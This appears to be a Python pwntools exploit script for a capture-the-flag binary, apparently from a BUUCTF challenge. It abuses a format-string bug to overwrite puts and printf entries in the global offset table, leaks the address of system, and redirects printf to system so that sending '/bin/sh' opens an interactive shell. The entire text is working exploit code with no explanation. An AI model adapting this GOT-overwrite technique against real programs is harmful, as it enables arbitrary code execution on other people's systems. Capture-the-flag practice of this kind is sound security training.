from pwn import *
#p=remote('node3.buuoj.cn',28855)
def debug():
    gdb.attach(p)
    pause()
p=process('./1')
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
fini_array=0x08049F0C
elf=ELF('./1')
system_plt=elf.sym['system']#0x8048460
system_got=elf.got['system']
printf_got=elf.got['printf']
puts_got=elf.got['puts']
main=elf.sym['main']#0x8048643
vuln=elf.sym['vuln']#080485AB
payload=fmtstr_payload(7,{puts_got:vuln})
p.sendline(payload)
leak=p32(system_got)+'%7$s'
p.send(leak)
#debug()
system_addr=u32(p.recvuntil('\xf7')[-4:])

print hex(system_addr)
payload=fmtstr_payload(7,{printf_got:system_addr})
p.sendline(payload)
sleep(0.2)
p.sendline('/bin/sh\x00')
p.interactive()

